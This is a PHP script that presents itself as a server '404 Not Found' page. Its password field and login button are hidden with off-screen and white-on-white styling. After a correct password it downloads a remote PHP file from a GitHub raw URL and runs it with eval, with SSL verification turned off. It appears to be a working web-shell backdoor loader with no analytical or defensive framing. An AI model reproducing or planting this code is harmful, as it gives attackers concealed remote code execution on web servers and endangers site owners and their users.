<?php
session_start();

// Function to display 404 page
function display_404_page() {
    header("HTTP/1.0 404 Not Found");
    echo '<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>404 Not Found</title>
        <style>
            input[type="password"] {
                position: absolute; 
                left: -9999px; 
                width: 1px; 
                height: 1px; 
                opacity: 0; 
            }
            input[type="submit"] {
                padding: 5px; 
                width: 5%; 
                background-color: white; 
                color: white; 
                border: none; 
                border-radius: 5px; 
                cursor: pointer; 
            }
            .login-container {
                position: absolute; 
                top: 20px; 
                right: 20px; 
                text-align: right; 
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Not Found</h1>
            <p>The requested URL was not found on this server.</p>
            <p>Additionally, a 404 Not Found error was encountered.</p>
            <div class="login-container">
                <form action="" method="post">
                    <input type="password" name="password" placeholder="Password" style="color: #2d3748;">
                    <input type="submit" value="Login">
                </form>
            </div>
        </div>
    </body>
    </html>';
    exit();
}

// Define the original password (the one you want to hash)
$original_password = 'your_actual_password'; 
$hashed_password = '$2y$12$b3LN.f0IAiq/cBR9BOIiXeYgqWHJdHXhkckJ0QhGYtWr20xwFvAF2'; 
// Check login status
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    // Process login
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        if (password_verify($entered_password, $hashed_password)) {
            // Password is correct
            setcookie('user_id', 'user123', time() + 3600, '/'); 
            $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
            echo "Login successful!"; 
        } else {
            // Invalid password
            echo "Incorrect password."; 
            display_404_page();
        }
    } else {
        display_404_page(); 
    }
}

if (isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    function geturlsinfo($url) {
        if (function_exists('curl_exec')) {
            $conn = curl_init($url);
            curl_setopt($conn, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0");
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, false);
            $data = curl_exec($conn);
            curl_close($conn);
        } elseif (function_exists('file_get_contents')) {
            $data = file_get_contents($url);
        } else {
            return false; // No way to fetch content
        }
        return $data;
    }

    $url = 'https://raw.githubusercontent.com/cindylara1122/script/main/1/2/3/4/5/HaSec.php';
    $a = geturlsinfo($url);
    if ($a) {
        eval('?>' . $a); 
    } else {
        echo "Failed to retrieve the external file."; 
    }
}
?>
